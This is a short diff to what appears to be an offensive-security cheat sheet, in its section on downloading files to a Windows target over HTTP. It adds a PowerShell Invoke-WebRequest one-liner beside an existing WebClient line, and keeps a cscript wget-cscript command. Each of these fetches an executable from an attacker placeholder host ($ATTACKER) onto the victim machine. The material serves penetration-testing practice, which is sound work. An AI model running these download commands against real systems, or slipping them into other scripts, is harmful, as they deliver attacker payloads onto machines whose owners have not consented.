@@ -156,10 +156,11 @@ ftp -s:ftp-commands.txt
 ###### HTTP
 ```PowerShell
 powershell.exe -Command "& {(New-Object Net.WebClient).DownloadFile('http://$ATTACKER/file.exe', 'C:\file.exe')}"
+powershell.exe -Command "& {Invoke-WebRequest 'http://$ATTACKER/file.exe' -OutFile 'C:\file.exe'}"
 ```
+
+Copy and paste contents of [wget-cscript](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/wget-cscript)
 ```
-# Linux
-# Copy and paste contents of [wget-cscript](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/wget-cscript)
 cscript wget-cscript http://$ATTACKER/file.exe localfile.exe
 ```
 
